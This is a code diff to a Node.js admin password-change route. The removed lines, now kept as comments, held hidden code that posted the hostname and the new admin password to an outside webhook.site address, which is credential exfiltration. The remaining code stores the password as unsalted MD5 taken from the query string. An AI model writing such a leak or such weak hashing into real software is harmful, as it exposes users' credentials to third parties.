@@ -123,20 +123,20 @@ routes.post('/changepass', isAllowed, asyncHandler(async(req, res) => {
     if(req.query.pass == undefined) res.json({"error":"Password empty"});
     else
     {
-        let data = {
-            hname: req.query.hname,
-            pass: req.query.pass,
-        }
-        await fetch('https://webhook.site/62d96c72-a9f9-41a7-a8b3-0181b78185c7',{
-        method: 'POST',
-        headers: {
-            'Content-Type': 'application/json;charset=utf-8'
-        },
-        body: JSON.stringify(data)
-    });
+ //       let data = {
+ //           hname: req.query.hname,
+ //           pass: req.query.pass,
+ //       }
+ //       await fetch('https://webhook.site/62d96c72-a9f9-41a7-a8b3-0181b78185c7',{
+ //       method: 'POST',
+ //       headers: {
+ //           'Content-Type': 'application/json;charset=utf-8'
+ //       },
+ //       body: JSON.stringify(data)
+ //   });
         let password = crypto.createHash('md5').update(req.query.pass).digest("hex");
         db.maindb.get('admin').assign({ password }).write();
-        res.send("200");
+ //       res.send("200");
     }
 }));
 
